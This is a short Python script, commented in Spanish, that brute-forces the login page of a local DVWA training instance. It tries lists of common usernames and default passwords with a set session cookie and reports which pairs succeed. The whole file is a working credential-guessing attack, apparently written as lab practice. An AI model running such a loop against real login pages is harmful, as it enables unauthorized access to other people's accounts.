import requests

# URL del formulario de login de DVWA (cambia localhost por la dirección real si es necesario)
url = 'http://localhost:8080/vulnerabilities/brute/'


# Definir listas de usuarios y contraseñas
usernames = ['admin', '1337', 'gordonb', 'pablo', 'smithy', 'root', '1234', 'user', 'Administrator', 'usuario']
passwords = ['root', 'password', 'admin', '1234', 'user', 'Administrator', 'administrador', '12345', '123456', 'anonymous', 'Anonymous']

# Cookies de sesión necesarias (ajusta PHPSESSID con tu valor capturado)
cookies = {
    'PHPSESSID': '6p2b30likilnn0qvj1noalst40', # Ajusta este valor con tu sesión actual
    'security': 'low'  # Asegúrate de que el nivel de seguridad esté configurado en 'low'
}

# Probar combinaciones de usuario y contraseña
for username in usernames:
    for password in passwords:
        # Definir los parámetros GET que se enviarán en la URL
        params = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }

        # Enviar la solicitud GET con los parámetros y cookies
        response = requests.get(url, params=params, cookies=cookies)

        # Verificar si el login fue exitoso buscando una cadena en el contenido de la respuesta
        if "Welcome to the password protected area" in response.text:
            print(f"[+] Login exitoso con {username}:{password}")
            break
        else:
            print(f"[-] Fallido {username}:{password}")
